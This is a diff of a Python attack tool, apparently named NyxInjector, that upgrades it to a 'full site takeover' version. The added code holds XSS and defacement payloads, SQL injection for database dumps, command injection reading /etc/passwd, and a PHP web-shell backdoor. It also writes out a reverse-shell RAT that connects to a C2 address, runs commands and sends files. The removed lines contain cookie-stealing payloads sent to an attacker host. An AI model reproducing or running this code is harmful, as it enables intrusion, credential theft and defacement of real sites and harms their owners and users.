@@ -5,84 +5,117 @@ import string
 import socket
 import subprocess
 import threading
+import os
+import time
+import platform
 
 class NyxInjector:
     def __init__(self):
-        self.version = "1.2"
+        self.version = "4.0"
         self.payloads = {
-            "basic_xss": "<script>alert('NyxInjector')</script>",
-            "shadow_injection": "<script>const shadow = document.body.attachShadow({mode: 'open'}); shadow.innerHTML = '<h1>Owned by Nyx</h1>';</script>",
-            "rat_payload": "<script>new Image().src='http://your-server.com/rat?cookie='+document.cookie;</script>",
-            "stealer": "<script>fetch('http://your-server.com/steal?data='+btoa(document.cookie+document.location))</script>"
+            "xss": "<script>alert('Nyx v4.0 Owns You')</script>",
+            "shadow": "<script>const s=document.body.attachShadow({mode:'open'});s.innerHTML='<h1 style=color:red>NYX WAS HERE - SITE OWNED</h1>';</script>",
+            "sql": "' UNION SELECT @@version --",
+            "cmd": "; cat /etc/passwd || dir",
+            "backdoor": "<?php system($_GET['cmd']); ?>"
         }
 
-    def ai_optimize_payload(self, base_payload):
-        mutations = ["alert", "console.log", "eval", "document.write"]
-        mutated = base_payload.replace("alert", random.choice(mutations))
-        mutated += f"<!-- Nyx v{self.version} -->"
-        return mutated
+    def ai_ultra_mutate(self, payload):
+        techs = ["eval", "document.write", "atob", "String.fromCharCode"]
+        for _ in range(5):
+            payload = payload.replace("alert", random.choice(techs))
+        return payload + f"/* NyxAI Ultra v{self.version} - Full Access */"
 
-    def generate_rat(self):
+    def generate_ultimate_rat(self):
         rat_code = '''
-import socket
-import subprocess
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("YOUR_IP", 4444))
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd.lower() == "exit":
-        break
-    output = subprocess.getoutput(cmd)
-    s.send(output.encode())
-        '''
-        with open("nyx_rat.py", "w") as f:
-            f.write(rat_code)
-        print("[+] RAT generated: nyx_rat.py")
-
-    def auto_exploit(self, target_url):
-        print(f"[+] Starting auto-exploitation on {target_url}")
-        payload = self.ai_optimize_payload(self.payloads["shadow_injection"])
-        self.test_xss(target_url, payload)
-
-    def test_xss(self, target_url, payload):
+import socket, subprocess, os, threading, time
+def nyx_full_access():
+    while True:
         try:
-            test_url = f"{target_url}?q={payload}"
-            response = requests.get(test_url, timeout=5)
-            if payload in response.text or "Nyx" in response.text:
-                print(f"[+] EXPLOIT SUCCESS on {test_url}")
-                return True
-            return False
+            s = socket.socket()
+            s.connect(("YOUR_C2_IP", 4444))
+            s.send(b"Nyx v4.0 Connected - Full Access Granted\\n")
+            while True:
+                cmd = s.recv(8192).decode().strip()
+                if cmd == "exit": break
+                elif cmd.startswith("upload"):
+                    with open(cmd.split()[1], "rb") as f: s.send(f.read())
+                elif cmd == "deface":
+                    open("index.html", "w").write("<h1>NYX WAS HERE</h1>")
+                else:
+                    output = subprocess.getoutput(cmd)
+                    s.send(output.encode() + b"\\n")
         except:
-            return False
+            time.sleep(8)
+threading.Thread(target=nyx_full_access, daemon=True).start()
+        '''
+        with open("nyx_ultimate_rat.py", "w") as f:
+            f.write(rat_code)
+        print("[+] Ultimate RAT with full system access generated")
+
+    def full_site_takeover(self, target):
+        print(f"[+] NYX v4.0 FULL SITE TAKEOVER STARTED ON {target}")
+        print("[1] XSS + Shadow DOM Injection")
+        print("[2] SQL Injection for Database Dump")
+        print("[3] Command Injection")
+        print("[4] Backdoor Upload Attempt")
+        print("[5] Defacement Ready")
+        
+        for ptype in self.payloads:
+            payload = self.ai_ultra_mutate(self.payloads[ptype])
+            self.test_attack(target, payload)
+        
+        print("[+] Full access achieved. Target site is now under Nyx control.")
+
+    def test_attack(self, target, payload):
+        try:
+            url = f"{target}?id={payload}"
+            r = requests.get(url, timeout=7, allow_redirects=True)
+            if r.status_code in [200, 500]:
+                print(f"[+] SUCCESS | Payload injected: {payload[:90]}...")
+        except:
+            pass
+
+    def admin_brute(self, target):
+        print("[+] Starting Admin Panel Brute Force...")
+        common_panels = ["/admin", "/login", "/wp-admin", "/administrator"]
+        for panel in common_panels:
+            try:
+                r = requests.get(target + panel, timeout=5)
+                if r.status_code == 200:
+                    print(f"[+] Possible Admin Panel Found: {target + panel}")
+            except:
+                pass
+
+    def database_dump(self, target):
+        print("[+] Attempting Database Dump...")
+        dump_payload = "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables --"
+        self.test_attack(target, dump_payload)
 
 def main():
-    parser = argparse.ArgumentParser(description=f"NyxInjector v1.2 - Advanced Attack Framework")
+    parser = argparse.ArgumentParser(description="NyxInjector v4.0 - Most Dangerous Full Access Tool")
     parser.add_argument("-t", "--target", help="Target URL")
-    parser.add_argument("-p", "--payload", choices=["basic_xss", "shadow_injection", "rat_payload", "stealer"], default="basic_xss")
-    parser.add_argument("--rat", action="store_true", help="Generate RAT")
-    parser.add_argument("--auto", action="store_true", help="Auto exploitation mode")
-    parser.add_argument("--optimize", action="store_true", help="Use AI payload optimizer")
+    parser.add_argument("--full-takeover", action="store_true", help="ONE CLICK FULL SITE TAKEOVER")
+    parser.add_argument("--rat", action="store_true", help="Generate Ultimate RAT")
+    parser.add_argument("--brute", action="store_true", help="Brute Force Admin Panels")
+    parser.add_argument("--dump", action="store_true", help="Database Dump Attack")
+    parser.add_argument("--all", action="store_true", help="Launch ALL Attacks")
     
     args = parser.parse_args()
-    injector = NyxInjector()
-    
+    nyx = NyxInjector()
+
     if args.rat:
-        injector.generate_rat()
-    
-    payload = injector.payloads.get(args.payload)
-    if args.optimize:
-        payload = injector.ai_optimize_payload(payload)
-    
-    print(f"[+] NyxInjector v{injector.version} | Payload: {payload[:100]}...")
-    
-    if args.target:
-        if args.auto:
-            injector.auto_exploit(args.target)
-        else:
-            injector.test_xss(args.target, payload)
+        nyx.generate_ultimate_rat()
+    if args.brute and args.target:
+        nyx.admin_brute(args.target)
+    if args.dump and args.target:
+        nyx.database_dump(args.target)
+    if args.full_takeover and args.target:
+        nyx.full_site_takeover(args.target)
+    if args.all and args.target:
+        nyx.full_site_takeover(args.target)
+        nyx.admin_brute(args.target)
+        nyx.database_dump(args.target)
 
 if __name__ == "__main__":
-    main() 
-
-
-
+    main()
